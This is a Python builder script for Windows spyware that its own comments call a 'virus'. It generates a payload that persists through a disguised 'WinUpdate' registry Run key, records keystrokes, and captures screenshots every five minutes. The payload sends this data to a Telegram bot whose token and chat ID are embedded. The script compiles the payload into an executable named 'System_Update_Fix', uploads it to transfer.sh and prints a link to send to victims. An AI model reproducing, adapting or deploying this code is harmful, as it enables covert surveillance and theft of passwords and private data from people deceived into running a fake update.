import os
import subprocess
import requests

# --- 🛠️ CONFIGURATION ---
BOT_TOKEN = "8624484237:AAGUFuUkEmPeTTYszqjP4GtV6A8ZmUh7Jv0"
CHAT_ID = "6304478243"
EXE_NAME = "System_Update_Fix"

# --- 1. GENERATE THE VIRUS CODE ---
virus_code = f"""
import socket, threading, time, os, pyautogui, sys, shutil, requests
from pynput.keyboard import Listener

def stay_active():
    try:
        path = os.path.join(os.environ["appdata"], "{EXE_NAME}.exe")
        if not os.path.exists(path):
            shutil.copyfile(sys.executable, path)
            os.system(f'reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WinUpdate /t REG_SZ /d "{{path}}" /f')
    except: pass

def send_tg(msg, file=None):
    try:
        url = "https://telegram.org{BOT_TOKEN}/"
        requests.post(url + "sendMessage", data={{"chat_id": "{CHAT_ID}", "text": msg}})
        if file:
            with open(file, "rb") as f:
                requests.post(url + "sendDocument", data={{"chat_id": "{CHAT_ID}"}}, files={{"document": f}})
    except: pass

log = ""
def on_press(key):
    global log
    log += str(key).replace("'", "")

def report():
    global log
    while True:
        time.sleep(300)
        try:
            pyautogui.screenshot("s.png")
            msg = f"📊 5-MIN REPORT\\nKeys: {{log}}"
            send_tg(msg, "s.png")
            log = ""
        except: pass

stay_active()
send_tg("🚀 Target Online")
threading.Thread(target=report, daemon=True).start()
with Listener(on_press=on_press) as l:
    l.join()
"""

with open("temp_virus.py", "w") as f:
    f.write(virus_code)

# --- 2. COMPILE TO EXE ---
print("[*] Compiling virus... please wait.")
subprocess.run(f"pyinstaller --noconsole --onefile --name {EXE_NAME} temp_virus.py", shell=True)

# --- 3. UPLOAD AND GENERATE LINK ---
print("[*] Uploading and generating link...")
file_path = f"dist/{EXE_NAME}.exe"
with open(file_path, 'rb') as f:
    response = requests.post('https://transfer.sh', files={EXE_NAME: f})

# --- 4. OUTPUT ---
print("\n" + "="*30)
print(f"✅ VIRUS GENERATED SUCCESSFULLY")
print(f"🔗 SEND THIS LINK: {response.text.strip()}")
print("="*30)
print("[!] Once they click and run, data will appear in your Telegram.")
